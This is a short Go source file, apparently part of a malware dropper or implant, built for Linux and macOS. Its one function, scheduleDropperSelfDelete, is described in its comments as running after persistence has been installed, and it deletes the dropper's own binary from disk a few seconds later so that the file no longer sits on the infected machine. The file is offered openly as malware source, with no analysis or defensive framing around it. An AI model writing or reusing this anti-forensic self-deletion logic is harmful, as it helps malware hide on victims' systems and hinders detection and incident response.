//go:build !windows && !dll_sideload

package main

import (
	"os"
	"time"
)

// scheduleDropperSelfDelete removes the original dropper binary after
// persistence has been set up. On Linux/macOS an open file can be unlinked
// immediately; the inode stays alive until the last file descriptor closes.
func scheduleDropperSelfDelete() {
	selfPath, err := os.Executable()
	if err != nil {
		return
	}
	go func() {
		time.Sleep(3 * time.Second)
		_ = os.Remove(selfPath)
	}()
}
